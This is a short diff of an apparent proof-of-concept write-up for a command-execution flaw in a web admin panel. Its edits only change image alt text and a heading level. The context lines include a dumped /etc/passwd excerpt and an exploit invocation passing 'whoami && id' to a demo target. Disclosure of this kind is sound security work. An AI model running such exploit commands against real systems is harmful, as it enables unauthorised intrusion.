@@ -8,8 +8,8 @@
 
 ### POC:
 
-<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/1.png" alt="Magento Image" width="1000">
-<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/2.png" alt="Magento Image" width="1000">
+<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/1.png" alt="Phoenix Image" width="1000">
+<img src="https://raw.githubusercontent.com/capture0x/Phoenix/main/2.png" alt="Phoenix Image" width="1000">
 
 
 1. **Login to admin panel:** 
@@ -63,7 +63,8 @@ webuzo:x:993:993::/home/webuzo:/bin/bash
 apache:x:992:991::/home/apache:/sbin/nologin
 apache:x:992:991::/home/apache:/sbin/nologin
 
-## Exploit :
+
+### Exploit :
 
 ```
 python3 phoenix.py https://demos6.softaculous.com/CE_Phoenixb619pdusey admin pass "whoami && id"
